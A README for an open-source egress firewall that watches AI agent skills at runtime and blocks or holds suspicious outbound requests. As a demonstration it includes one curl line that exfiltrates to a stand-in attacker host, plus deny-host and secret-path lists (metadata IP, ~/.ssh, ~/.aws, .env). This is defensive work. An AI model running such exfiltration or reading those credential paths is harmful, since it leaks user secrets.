<div align="center">
  <h1>Agent Skill Firewall</h1>
  <p><b>Judge an agent skill by what it <i>does</i> at runtime.</b></p>
  <p>
    <a href="https://github.com/KuiyiGao/agent-skill-firewall/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/KuiyiGao/agent-skill-firewall/actions/workflows/ci.yml/badge.svg"></a>
    <img alt="Python 3.10 | 3.11 | 3.12" src="https://img.shields.io/badge/python-3.10%20%7C%203.11%20%7C%203.12-blue.svg">
    <a href="LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-green.svg"></a>
    <a href="#which-agent-are-you-running"><img alt="adapts OpenClaw, Hermes, Claude Code, Cursor" src="https://img.shields.io/badge/adapts-OpenClaw%20%C2%B7%20Hermes%20%C2%B7%20Claude%20Code%20%C2%B7%20Cursor-8A2BE2.svg"></a>
  </p>
</div>

An egress proxy sits between your agent and the internet and allows, holds or
blocks each request by host. `firewall watch` and `firewall bench` replay a
skill's logged traffic against five invariants and return one of three
verdicts. Rules live in a TOML file you can `diff`.

<div align="center">
<table>
<tr>
  <td align="center"><img alt="PASS" src="https://img.shields.io/badge/PASS-2ea44f?style=for-the-badge"><br><sub>declared intent,<br>allowed host</sub></td>
  <td align="center"><img alt="DEFER" src="https://img.shields.io/badge/DEFER-daaa00?style=for-the-badge"><br><sub>diverges from intent:<br>tighten egress and re-run</sub></td>
  <td align="center"><img alt="BLOCK" src="https://img.shields.io/badge/BLOCK-d1242f?style=for-the-badge"><br><sub>hostile host, cross-plane<br>taint, or injection</sub></td>
</tr>
</table>
</div>

```
   ┌──────────────┐   HTTP_PROXY    ┌──────────────┐   allow ─▶ internet
   │ your agent   │ ──────────────▶ │   firewall   │
   │ openclaw ·   │   (port 8080)   │ proxy+canary │   deny  ─▶ 403 / hold
   │ hermes · …   │ ◀── allow/deny ─│  + L0 + L2   │
   └──────┬───────┘                 └──────┬───────┘
          │ reads SKILL.md                 │ events.jsonl
          │ from .openclaw/skills,         ▼
          │ .hermes/skills, …         firewall panel  (terminal or --web)
```

## Get started in 3 steps

```bash
pip install git+https://github.com/KuiyiGao/agent-skill-firewall    # 1. install
export DEEPSEEK_API_KEY=...              # required by `firewall start`
firewall config init && firewall start   # 2. run the firewall (proxy + canary)
eval "$(firewall hook hermes)"           # 3. in a second terminal: route your agent, then run it
```

Open a live view any time with `firewall panel` (terminal) or
`firewall panel --web` (browser).

## Which agent are you running?

`firewall hook <agent>` prints the exact lines to route that agent's traffic
through the firewall. Run `firewall agents` to see this table on your machine.

<table>
<tr><th>Agent</th><th>Runtime</th><th>How its traffic is caught</th><th>Hook</th></tr>
<tr>
  <td><b>Hermes</b></td><td>Python</td>
  <td>Honours <code>HTTP_PROXY</code> out of the box (httpx / requests).</td>
  <td><code>firewall hook hermes</code></td>
</tr>
<tr>
  <td><b>OpenClaw</b></td><td>Node</td>
  <td>Node <code>fetch</code> ignores <code>HTTP_PROXY</code>, so it needs the undici bootstrap or Docker (see the OpenClaw section below).</td>
  <td><code>firewall hook openclaw</code></td>
</tr>
<tr>
  <td><b>Claude Code</b></td><td>Node</td>
  <td>Honours <code>HTTP_PROXY</code> / <code>HTTPS_PROXY</code>.</td>
  <td><code>firewall hook claude-code</code></td>
</tr>
<tr>
  <td><b>Cursor</b></td><td>Electron</td>
  <td>Set the proxy in Settings → Network (or via env).</td>
  <td><code>firewall hook cursor</code></td>
</tr>
<tr>
  <td>Codex · Gemini · OpenCode · <i>any</i></td><td>—</td>
  <td>Standard <code>HTTP_PROXY</code> works.</td>
  <td><code>firewall hook generic</code></td>
</tr>
</table>

## Point it at your skills

The firewall scans `SKILL.md` folders where they already live, without
installing them.

`cd` into an agent project (`.openclaw/skills`, `.hermes/skills`, `.claude/skills`, …)
and the firewall finds its skills automatically:

```bash
cd ~/my-agent-project
firewall skills                # list every skill it can see
firewall bench .hermes/skills  # batch-scan a folder -> CSV
```

For your own folder of copied skills, pass it with `--dir`:

```bash
firewall skills --dir ~/audit-me     # list them
firewall bench  ~/audit-me           # batch-scan -> CSV
firewall scan   ~/audit-me/one-skill # scan one skill
```

<sub>Discovery checks the current directory and every directory above it, plus `~`, for
`.openclaw/skills`, `.hermes/skills`, `.claude/skills`, `.cursor/skills`,
`.codex/skills`, `.gemini/skills`, `.opencode/skills`, `.agents/skills`,
and a bare `skills/`.</sub>

---

<details>
<summary><b>Enforcement modes</b></summary>

<br>

`firewall config mode` writes one line to the TOML, and the running proxy
picks it up on the next request without a restart.

```bash
firewall config mode strict      # block known-bad AND unknown hosts
firewall config mode balanced    # block known-bad, hold unknown (default)
firewall config mode observe     # record only, never block (use for onboarding)
```

Onboard in `observe` for a day to learn which hosts your agent legitimately
needs, add them to `allow_hosts`, then switch to `balanced` or `strict`.

</details>

<details>
<summary><b>From a static scan to a runtime verdict</b></summary>

<br>

`scan` and `bench` run the static (L0) pass. To catch a skill that misbehaves
only when it runs, put the firewall on the wire:

```bash
firewall start

# a skill tries to exfiltrate; the proxy blocks it before it leaves:
curl -x http://127.0.0.1:8080 http://attacker-canary.evil/exfil
#   HTTP 403  (denied by firewall)

# replay the proxy's event log (path: `firewall config show`) into an L2 verdict:
firewall watch ~/audit-me/one-skill --log-file /path/to/events.jsonl
#   MALICIOUS score=90  confirmations: hostile_destination:attacker-canary.evil
```

For a per-skill verdict, replay a log that covers that skill's run.

</details>

<details>
<summary><b>OpenClaw: Node <code>fetch</code> ignores HTTP_PROXY</b></summary>

<br>

OpenClaw uses Node's native `fetch` (undici), which ignores `HTTP_PROXY`
(verified against `openclaw@2026.6.10`). There are three ways around it.

Node bootstrap (host mode) injects an undici `ProxyAgent`:

```bash
npm install -g undici
firewall start
# in a second terminal:
export NODE_PATH="$(npm root -g)"   # lets the bootstrap find the global undici
export FIREWALL_PROXY=http://127.0.0.1:8080
NODE_OPTIONS="--require $(firewall integrations openclaw-bootstrap)" \
  openclaw skills search hello
```

In Docker mode the compose network catches all traffic:

```bash
cd firewall/docker
export DEEPSEEK_API_KEY=sk-...
docker compose --profile agent up        # firewall + openclaw
```

Per-provider config pins model-API traffic on the host. The proxy is a
single object (set it whole, not field by field), the key is `url`, and `<id>`
must be a real provider from `openclaw config get models.providers`:

```bash
firewall start
openclaw config set 'models.providers.<id>.request.proxy' \
  '{"mode":"explicit-proxy","url":"http://127.0.0.1:8080"}'
# then restart the OpenClaw gateway to apply
```

`HTTP_PROXY`/`HTTPS_PROXY` still catch subprocesses a skill spawns
(`curl`, `pip`, `npm`) in every mode.

</details>

<details>
<summary><b>Hermes: Python honours HTTP_PROXY</b></summary>

<br>

Hermes Agent (NousResearch) is written in Python (httpx / requests), which
reads the proxy environment variables, so no bootstrap is needed:

```bash
firewall start
eval "$(firewall hook hermes)"    # exports HTTP_PROXY / HTTPS_PROXY / ALL_PROXY
hermes                            # run normally; traffic transits the firewall
```

Hermes reads skills from `~/.hermes/skills` (and `skills.external_dirs` in
`~/.hermes/config.yaml`); `firewall skills` discovers them. `httpx` reads the
environment only when `trust_env` is on (the default); if a custom endpoint
sets it to `False`, pass `proxies=` explicitly.

</details>

<details>
<summary><b>Docker mode</b></summary>

<br>

```bash
firewall start --mode docker     # brings up firewall/docker/compose.yml
firewall panel                   # reads the same events.jsonl
```

The `firewall` service runs the proxy and canary. The optional `openclaw`
service (behind `--profile agent`) bakes in the proxy bootstrap; mount your
skills by editing its volume in `firewall/docker/compose.yml`. Run Docker mode
from a clone of this repository installed with `pip install -e .` (or
`make install`); the image builds from the source tree.

</details>

<details>
<summary><b>Command reference</b></summary>

<br>

| Command | Does |
|---|---|
| `firewall config init` / `show` / `path` | manage `~/.config/firewall/config.toml` |
| `firewall config mode <strict\|balanced\|observe>` | set enforcement level (applies without a restart) |
| `firewall start [--mode host\|docker]` | egress proxy + canary |
| `firewall stop` | docker-compose down |
| `firewall panel [--web]` | live panel: passed / deferred / blocked, session counts, recent events |
| `firewall scan <skill>` | L0 static scan of one skill |
| `firewall watch <skill> --log-file <log>` | L2 verdict from a stored proxy log |
| `firewall bench <dir> [--log-dir <d>]` | batch L0+L2 over a folder of skills, written as CSV; `--log-dir` holds one `<name>.log` per skill, named after the `name:` in its SKILL.md |
| `firewall skills [--dir <p>]` | list every skill on disk (framework-agnostic) |
| `firewall agents` | list the agent frameworks the firewall adapts to |
| `firewall hook <agent>` | print env-vars / config to route an agent through the proxy |
| `firewall integrations openclaw-bootstrap` | print absolute path to the Node `--require` helper |
| `firewall doctor` | health check (config, API-key env var, ports, docker) |

</details>

<details>
<summary><b>Configuration (<code>~/.config/firewall/config.toml</code>)</b></summary>

<br>

Every pattern lives in one TOML file you can `diff`. On macOS the file is under
`~/Library/Application Support/firewall/`; `firewall config path` prints it.

```toml
[driver]
provider     = "deepseek"
model        = "deepseek-chat"
api_key_env  = "DEEPSEEK_API_KEY"   # NAME of the env var, NOT the key itself

[policy]
mode = "balanced"                   # strict | balanced | observe

[egress]
allow_hosts = ["api.deepseek.com", "*.pypi.org", ...]
deny_hosts  = ["169.254.169.254", "*.webhook.site", ...]

[secrets]
secret_paths = ["~/.ssh", "~/.aws", ".env"]
secret_env   = ["DEEPSEEK_API_KEY", "AWS_SECRET_ACCESS_KEY"]

[judge]
refusal_patterns    = [ ... ]   # tie-breaker only
compliance_patterns = [ ... ]
```

The runtime is deterministic.

</details>

<details>
<summary><b>Verdict ladder and the five invariants</b></summary>

<br>

1. MALICIOUS (block, score 75 to 90): host classified hostile, cross-plane taint, or injection compliance.
2. SUSPICIOUS (defer and tighten egress, score 40+): any divergence from declared intent.
3. BENIGN (pass): everything else.

The five invariants the ladder enforces are in
[firewall/runtime/firewall.py](firewall/runtime/firewall.py) and pinned by one
named test each in
[tests/unit/test_firewall_invariants.py](tests/unit/test_firewall_invariants.py).
`watch` and `bench` replay the egress plane from a proxy log. To apply the
cross-plane taint rule, pass the run's tool calls together with its egress to
the Python API (`firewall.analyze_iar`).

</details>

<details>
<summary><b>Adapting a new agent (code layout)</b></summary>

<br>

Both skill discovery and `firewall hook` read one file:
[firewall/integrations/agents.py](firewall/integrations/agents.py). A framework
is a single `AgentProfile`: where it keeps skills, and how its traffic leaves
the process (`egress`: `env` / `node-undici` / `app-config`). Adding Hermes
took ~12 lines, all in that file.

```
firewall/
  cli.py            entry point for all subcommands
  config.py         TOML loader + default patterns
  runtime/          L2 IAR verifier, egress proxy, canary, supervisor, events
  gate/             L0 static scanner
  skills/           SKILL.md discovery (dirs sourced from the agent registry)
  integrations/     agents.py registry + openclaw/proxy-bootstrap.js
  panel/            tui.py (terminal) + web.html/web.py (browser)
  docker/           minimal compose stack
  examples/         weather-safe + weather-malicious-canary
```

</details>

<details>
<summary><b>Evaluation</b></summary>

<br>

Two example skills ship under `firewall/examples/skills/`.
`firewall bench firewall/examples/skills` gives the static column. Running the
canary skill through the proxy and replaying its log gives the runtime column
(see "From a static scan to a runtime verdict" above).

| Case | Truth | L0 (static) | IAR (runtime replay) |
|---|---|---|---|
| `weather-safe` | benign | NONE | BENIGN |
| `weather-malicious-canary` | malicious | CRITICAL | MALICIOUS |

[NVIDIA SkillSpector](https://github.com/NVIDIA/skillspector) scans a skill
before it is installed. This firewall watches egress while the skill runs, so
the two can be used together.

</details>

## License

MIT. See [LICENSE](LICENSE).
